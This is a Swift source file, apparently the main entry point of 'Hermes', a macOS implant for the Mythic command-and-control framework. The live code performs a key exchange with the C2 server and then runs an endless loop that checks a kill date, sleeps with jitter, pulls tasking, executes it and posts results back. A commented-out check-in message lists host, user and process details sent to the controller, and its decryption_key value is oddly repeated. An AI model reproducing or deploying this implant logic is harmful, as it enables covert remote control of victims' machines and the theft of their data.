//
//  main.swift
//  Hermes
//
//  Created by slyd0g on 5/18/21.
//

import Foundation

// // Plaintext checkin
// var jsonPayload = JSON([
//     "action": "checkin",
//     "uuid": "592d1ba5-492f-42d4-9f1b-9d1f6ab3d6e2",
//     "ips": ["127.0.0.1"], // internal ip addresses - optional
//     "os": "macOS 10.15", // os version - optional
//     "user": "its-a-feature", // username of current user - optional
//     "host": "spooky.local", // hostname of the computer - optional
//     "pid": 4444, // pid of the current process - optional
//     "architecture": "x64", // platform arch - optional
//     "domain": "test", // domain of the host - optional
//     "integrity_level": 3, // integrity level of the process - optional
//     "external_ip": "8.8.8.8", // external ip if known - optional
//     "encryption_key": "base64 of key", // encryption key - optional
//     "decryption_key": "base64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of keybase64 of key", // decryption key - optional
//     "process_name": "osascript", // name of the current process - optional
// ])

// let hermesMessage = try! toBase64(data: toData(string: "592d1ba5-492f-42d4-9f1b-9d1f6ab3d6e2") + jsonPayload.rawData())
// get(data: hermesMessage)

// Perform key exchange to grab new AES key from Mythic per implant
if (!encryptedKeyExchange())
{
    exit(0)
}

// Begin main program execution: check kill date, sleep, get tasking from Mythic, execute tasking from Mythic, post tasking to Mythic
var jobs = JobList()
while(true)
{
    checkKillDate()
    sleepWithJitter()
    do {
        try getTasking(jobList: jobs)
        executeJob(jobList: jobs)
        postResponse(jobList: jobs)
    }
    catch {
    }
    
}

